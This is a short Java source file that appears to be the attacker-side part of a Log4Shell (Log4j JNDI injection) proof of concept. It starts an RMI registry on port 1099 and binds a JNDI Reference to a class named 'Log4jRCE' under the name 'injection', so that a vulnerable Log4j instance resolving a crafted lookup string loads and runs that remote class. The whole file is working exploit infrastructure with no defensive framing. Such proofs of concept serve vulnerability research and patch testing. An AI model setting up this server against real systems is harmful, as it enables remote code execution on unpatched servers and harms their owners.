import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.Reference;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.util.Arrays;

/**
 * @className: Server
 * @description:
 * @author: yloopdaed
 * @date: 2021/12/11
 **/
public class RMIServer {
    public static void main(String[] args) {
        try {
            LocateRegistry.createRegistry(1099);
            Registry registry = LocateRegistry.getRegistry();
            Reference tReference = new Reference("Log4jRCE", "Log4jRCE", null);
            ReferenceWrapper referenceWrapper = new ReferenceWrapper(tReference);
            System.out.println("Registry&Server Start");
            registry.bind("injection", referenceWrapper);
            System.out.println("Registry List: " + Arrays.toString(registry.list()));

        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
